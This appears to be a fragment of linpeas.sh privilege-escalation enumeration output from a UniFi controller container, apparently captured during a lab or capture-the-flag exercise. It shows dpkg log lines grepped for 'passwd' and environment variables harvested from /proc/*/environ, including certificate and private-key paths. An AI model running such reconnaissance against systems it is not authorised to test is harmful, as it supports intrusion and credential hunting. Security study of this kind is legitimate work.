/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/dpkg.log:2021-08-27 07:16:53 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:53 install base-passwd:amd64 <none> 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:53 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:53 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:53 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:55 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:58 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:58 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:58 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:16:58 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:01 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:01 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:02 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2021-08-27 07:17:02 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:02 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:02 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:03 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:04 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2021-08-27 07:17:04 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:04 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:04 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:45 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:45 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:45 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:45 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:46 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2021-08-27 07:17:46 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:46 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:46 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2021-08-27 07:17:48 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2021-08-27 07:17:48 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:48 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:48 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:48 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:17:48 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:18:15 configure passwd:amd64 1:4.5-1ubuntu2 <none>
/var/log/dpkg.log:2021-08-27 07:18:15 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:18:15 status half-configured passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2021-08-27 07:18:15 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:18:15 status installed passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2021-08-27 07:18:15 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2021-08-27 07:18:15 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2021-08-27 07:18:15 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
BASEDIR=/usr/lib/unifi                                                                                                                                       
BIND_PRIV=true
CERTDIR=/unifi/cert
CERTNAME=cert.pem
CERT_IS_CHAIN=false
CERT_PRIVATE_NAME=privkey.pem
DATADIR=/unifi/data
GOSU_VERSION=1.10
HOME=/home/unifi
HOSTNAME=unified
LOGDIR=/unifi/log
ODATADIR=/var/lib/unifi
OLDPWD=/tmp
OLDPWD=/unifi
OLDPWD=/usr/lib/unifi
OLOGDIR=/var/log/unifi
PWD=/home
PWD=/tmp/ignore
PWD=/usr/lib/unifi
RUNAS_UID0=true
RUNDIR=/var/run/unifi
SHLVL=1
SHLVL=2
SHLVL=3
SHLVL=4
SHLVL=5
SHLVL=6
TZ=Europe/London
UNIFI_GID=999
UNIFI_UID=999
_=./linpeas.sh
_=/bin/bash
_=/bin/dd
_=/bin/grep
_=/bin/sh
_=/usr/bin/java
_=foo


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                           
                                ╚════════════════╝                                                                                                           
Regexes to search for API keys aren't activated, use param '-r' 


```